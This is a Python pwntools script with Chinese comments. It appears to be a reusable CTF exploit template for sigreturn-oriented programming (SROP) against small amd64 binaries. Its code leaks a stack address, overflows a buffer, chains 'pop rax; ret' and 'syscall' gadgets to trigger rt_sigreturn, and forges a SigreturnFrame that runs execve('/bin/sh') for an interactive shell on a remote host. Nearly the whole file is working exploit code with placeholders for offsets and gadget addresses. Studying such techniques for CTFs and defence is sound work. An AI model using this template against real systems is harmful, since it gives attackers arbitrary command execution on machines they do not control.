#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: SROP 模板 —— rt_sigreturn 系统调用恢复寄存器现场, 直接 execve("/bin/sh", 0, 0)
适用条件:
    - 64 位 (amd64); 二进制极小, 无 libc 或 payload 长度受限
    - 有 Gadgets: pop rax; ret (rax=15) 和 syscall; 或二进制自带 "mov rax, 15; syscall" 片段
    - 能拿到一次栈地址泄露(程序回显 buf 内容时残留栈指针 / 直接打印栈变量)
用法:
    1) 改 CONFIG 区: HOST/PORT/OFFSET/BUF 栈地址来源与三个 gadget 地址
    2) 泄露解析处按程序实际输出格式调整
"""
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"            # TODO: 改这里
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
OFFSET = 0x10               # TODO: 改这里: 溢出到返回地址的字节数
POP_RAX_RET = 0x400000      # TODO: 改这里: gadget: pop rax; ret (ROPgadget 查)
SYSCALL_RET = 0x400001      # TODO: 改这里: gadget: syscall; ret (或纯 syscall)
# =============================================================

context.arch = "amd64"
context.log_level = "info"
elf = ELF(BINARY, checksec=False)


def start():
    # TODO: 改这里: 本地调试换成 process(BINARY)
    return remote(HOST, PORT)


def leak_stack(io):
    """泄露一个栈地址: 常见套路是程序把 read 进来的 buf 原样 write 回来,
    buf 内残留旧栈指针; 或程序直接 printf(buf) 带 %p"""
    # TODO: 改这里: 按程序实际交互与输出格式改
    io.sendlineafter(b">", b"leak")          # 触发泄露的输入
    io.recvuntil(b"stack: ")
    stack_addr = int(io.recvline().strip(), 16)
    log.success(f"stack leak = {hex(stack_addr)}")
    return stack_addr


def build_srop(binsh_addr):
    """构造 SigreturnFrame: sigreturn 后寄存器全部被 frame 覆盖, rip 直达 syscall"""
    frame = SigreturnFrame()
    frame.rax = constants.SYS_execve   # 59
    frame.rdi = binsh_addr             # execve 第 1 参: "/bin/sh"
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = SYSCALL_RET            # sigreturn 返回后执行 syscall
    return bytes(frame)


def pwn():
    io = start()
    stack = leak_stack(io)
    binsh_addr = stack  # "/bin/sh" 会写在我们输入的开头, 即泄露的栈地址处

    # 布局: ["/bin/sh\0" 填充到 OFFSET] [pop rax; ret] [15] [syscall] [SigreturnFrame]
    # 溢出后依次执行: rax=15 -> syscall 触发 rt_sigreturn -> 按 frame 恢复寄存器 -> execve
    payload = b"/bin/sh\x00".ljust(OFFSET, b"a")
    payload += p64(POP_RAX_RET) + p64(constants.SIGRETURN)  # SIGRETURN = 15
    payload += p64(SYSCALL_RET)
    payload += build_srop(binsh_addr)

    io.sendlineafter(b">", payload)   # TODO: 改这里: 程序输入提示符
    io.interactive()


if __name__ == "__main__":
    pwn()
